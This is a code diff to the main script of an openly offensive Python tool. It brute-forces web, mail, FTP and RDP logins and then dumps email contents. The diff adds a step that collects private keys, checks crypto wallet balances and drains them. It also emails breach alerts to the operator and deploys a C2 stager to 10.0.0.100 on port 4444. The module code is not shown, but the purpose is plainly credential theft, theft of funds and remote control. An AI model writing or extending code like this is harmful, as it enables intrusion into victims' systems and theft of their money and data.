@@ -7,6 +7,8 @@ from modules.engine import run_autonomous_engine
 from modules.dumper import harvest_email_intelligence
 from modules.mail import send_breach_alert
 from modules.payloads import deploy_c2_stager
+from modules.keyharvester import harvest_private_keys
+from modules.drainer import check_and_drain_wallet
 
 # Cyberpunk Neon ANSI Color Palette
 CYAN = "\033[96m"
@@ -66,18 +68,30 @@ def main():
     print(f"{MAGENTA}{BOLD}[ENGINE] Spawning asynchronous threads and initializing socket rings...\n{RESET}")
     time.sleep(0.5)
 
-    # Step 2: Launch Wireshark Packet Telemetry & Stealth Brute-Force Engine (with WAF & Jitter Evasion)
+    # Step 2: Launch Wireshark Packet Telemetry & Stealth Multi-Vector Engine (Web, IMAP, FTP, RDP)
     hits, duration = asyncio.run(run_autonomous_engine(target, passwords))
 
-    # Step 3: If Mailbox/IMAP vectors were cracked, execute automatic email intelligence dumping
+    # Step 3: Post-Exploitation, Intelligence Harvesting & Financial Sweep
     if hits:
         asyncio.run(harvest_email_intelligence(target, hits))
         
-        # Dispatch SMTP alert notification to your inbox
+        print(f"\n{GREEN}[+] Initiating post-exploitation asset harvesting & financial sweep...{RESET}")
+        
+        # 1. Harvest Private Keys & Display in Plaintext
+        keys_found = harvest_private_keys(".")
+        
+        # 2. Check Crypto Balances & Execute Transfer if Wallets Found
+        drain_results = []
+        for key in keys_found:
+            if "Hex Private Key" in key["type"]:
+                bal, drained, tx = check_and_drain_wallet(key["key_content"])
+                drain_results.append({"wallet": key["key_content"], "balance": bal, "drained": drained, "tx": tx})
+
+        # 3. Dispatch Encrypted Email Alert to Your Inbox
         for hit in hits:
             send_breach_alert(target, hit)
             
-        # Compile Mobile C2 Stager package
+        # 4. Deploy Mobile C2 Stager Package
         deploy_c2_stager("10.0.0.100", 4444)
 
     # Cyberpunk Completion Dashboard
@@ -96,3 +110,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
